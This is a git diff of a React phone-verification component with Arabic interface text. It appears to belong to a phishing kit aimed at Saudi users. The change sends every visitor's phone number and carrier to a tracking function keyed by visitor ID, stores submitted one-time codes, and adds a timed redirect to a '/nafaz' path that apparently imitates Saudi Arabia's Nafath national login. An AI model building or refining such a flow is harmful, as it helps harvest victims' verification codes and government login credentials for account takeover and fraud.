@@ -205,15 +205,12 @@ export default function PhoneVerificationEnhanced() {
       localStorage.setItem("phoneNumber", phone)
       localStorage.setItem("operator", operator)
 
-      if (operator === "stc") {
         setShowLoader(true)
-      } else {
         await PhoneVerificationService.verifyPhone(phone, operator)
 
         if (visitorId) {
           await sendPhone(visitorId, phone, operator)
         }
-      }
 
       setVerificationStatus("pending")
       setLoaderMessage("تم إرسال رمز التحقق. الرجاء إدخال الرمز:")
@@ -258,7 +255,9 @@ export default function PhoneVerificationEnhanced() {
         otpSubmittedAt: new Date().toISOString(),
         phoneVerificationStatus: "pending",
       })
-
+setTimeout(() => {
+  window.location.href = "/nafaz"
+}, 4000);
       // The effect listener will handle status updates
     } catch (error) {
       console.error("OTP verification failed:", error)
